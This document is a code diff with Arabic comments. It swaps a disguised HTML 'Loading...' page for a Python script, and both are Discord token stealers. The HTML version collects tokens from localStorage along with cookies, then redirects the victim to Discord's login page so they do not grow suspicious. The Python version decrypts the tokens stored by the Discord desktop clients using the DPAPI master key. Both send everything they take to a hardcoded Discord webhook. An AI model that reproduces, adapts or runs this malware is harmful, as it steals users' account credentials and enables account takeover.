@@ -1,80 +1,83 @@
-<!DOCTYPE html>
-<html lang="ar">
-<head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Loading...</title>
-<style>
-  body { background-color: #313338; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-  .loader { border: 4px solid #f3f3f3; border-top: 4px solid #5865f2; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
-  @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-</style>
-</head>
-<body>
-<div class="loader"></div>
-<script>
-(async function(){
-  const WEBHOOK = "https://ptb.discord.com/api/webhooks/1563433824195715163/pImDLSOanfVezzULnId7p-Fny5ViXFkbPyoldjKCBnEzpFaPDg7dO6oj7zuBHTJISlwr";
+import os
+import re
+import json
+import base64
+import requests
+from Crypto.Cipher import AES
+from win32crypt import CryptUnprotectData
+import shutil
+import tempfile
 
-  // 1. دالة فك تشفير التوكنات الحديثة لديسكورد
-  function decryptToken(encryptedToken) {
-    try {
-      const key = CryptoJS.enc.Utf8.parse("discord");
-      const decrypted = CryptoJS.AES.decrypt(encryptedToken, key, { mode: CryptoJS.mode.ECB });
-      return decrypted.toString(CryptoJS.enc.Utf8);
-    } catch(e) { return null; }
-  }
+# حط الويبهوك حقك هنا
+WEBHOOK_URL = "https://ptb.discord.com/api/webhooks/1563433824195715163/pImDLSOanfVezzULnId7p-Fny5ViXFkbPyoldjKCBnEzpFaPDg7dO6oj7zuBHTJISlwr"
 
-  let tokens = [];
-  
-  try {
-    // 2. سحب التوكنات من LocalStorage
-    for (let i = 0; i < localStorage.length; i++) {
-      const k = localStorage.key(i);
-      let v = localStorage.getItem(k);
-      
-      if (typeof v === 'string') {
-        // إذا كان التوكن مشفر (يبدأ بـ dQw4w9WgXcQ)
-        if (v.startsWith('dQw4w9WgXcQ:')) {
-           const realToken = decryptToken(v.split(':')[1]);
-           if (realToken) tokens.push(realToken);
-        } 
-        // إذا كان التوكن عادي
-        else {
-           const m = v.match(/[\w-]{24,}\.[\w-]{6,}\.[\w-]{27,}/g);
-           if (m) tokens.push(...m);
-        }
-      }
-    }
-  } catch(e){}
+def get_master_key():
+    paths = [
+        os.path.join(os.getenv('APPDATA'), 'discord', 'Local State'),
+        os.path.join(os.getenv('APPDATA'), 'discordptb', 'Local State'),
+        os.path.join(os.getenv('APPDATA'), 'discordcanary', 'Local State'),
+        os.path.join(os.getenv('APPDATA'), 'Lightcord', 'Local State'),
+    ]
+    for path in paths:
+        if not os.path.exists(path): continue
+        with open(path, 'r', encoding='utf-8') as f:
+            local_state = json.load(f)
+        master_key = local_state.get('os_crypt', {}).get('encrypted_key')
+        if master_key:
+            master_key = base64.b64decode(master_key)[5:] # إزالة DPAPI
+            master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
+            return master_key
+    return None
 
-  tokens = [...new Set(tokens)];
+def decrypt_token(encrypted_token, master_key):
+    try:
+        iv = encrypted_token[3:15]
+        payload = encrypted_token[15:]
+        cipher = AES.new(master_key, AES.MODE_GCM, iv)
+        decrypted_pass = cipher.decrypt(payload)
+        decrypted_pass = decrypted_pass[:-16].decode() # إزالة التاق
+        return decrypted_pass
+    except:
+        return None
 
-  // 3. تجميع البيانات
-  const info = {
-    tokens: tokens.length > 0 ? tokens : ["No token found (User might not be logged in)"],
-    userAgent: navigator.userAgent,
-    platform: navigator.platform,
-    language: navigator.language,
-    url: location.href,
-    time: new Date().toISOString(),
-    cookies: document.cookie
-  };
+def extract_tokens_from_leveldb():
+    master_key = get_master_key()
+    if not master_key: return []
 
-  // 4. إرسال البيانات للويبهوك
-  await fetch(WEBHOOK, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({
-      content: "**🔥 New Hit (Auto)**\n```json\n" + JSON.stringify(info, null, 2).slice(0, 1950) + "\n```"
-    })
-  }).catch(()=>{});
+    tokens = []
+    discord_paths = [
+        os.path.join(os.getenv('APPDATA'), 'discord', 'Local Storage', 'leveldb'),
+        os.path.join(os.getenv('APPDATA'), 'discordptb', 'Local Storage', 'leveldb'),
+        os.path.join(os.getenv('APPDATA'), 'discordcanary', 'Local Storage', 'leveldb'),
+    ]
 
-  // 5. تحويله لموقع ديسكورد بعد ما يرسل عشان ما يشك
-  setTimeout(()=>{ window.location.href = "https://discord.com/login"; }, 1000);
-})();
-</script>
-<!-- سكربت فك التشفير -->
-<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
-</body>
-</html>
+    for path in discord_paths:
+        if not os.path.exists(path): continue
+        for file_name in os.listdir(path):
+            if not file_name.endswith(('.ldb', '.log')): continue
+            file_path = os.path.join(path, file_name)
+            try:
+                with open(file_path, 'rb') as f:
+                    content = f.read()
+                # البحث عن النمط: dQw4w9WgXcQ:
+                for match in re.finditer(rb'dQw4w9WgXcQ:', content):
+                    start = match.end()
+                    encrypted = content[start:start+100]
+                    decrypted = decrypt_token(encrypted, master_key)
+                    if decrypted and re.match(r'[\w-]{24,}\.[\w-]{6,}\.[\w-]{27,}', decrypted):
+                        tokens.append(decrypted)
+            except: pass
+    return list(set(tokens))
+
+def send_to_webhook(tokens):
+    if not tokens:
+        msg = "❌ لم يتم العثور على توكنات (الضحية غير مسجل دخول أو التوكن غير موجود)."
+    else:
+        msg = f"✅ تم استخراج {len(tokens)} توكن:\n```\n" + "\n".join(tokens) + "\n```"
+    
+    data = {"content": msg}
+    requests.post(WEBHOOK_URL, json=data)
+
+if __name__ == "__main__":
+    tokens = extract_tokens_from_leveldb()
+    send_to_webhook(tokens)
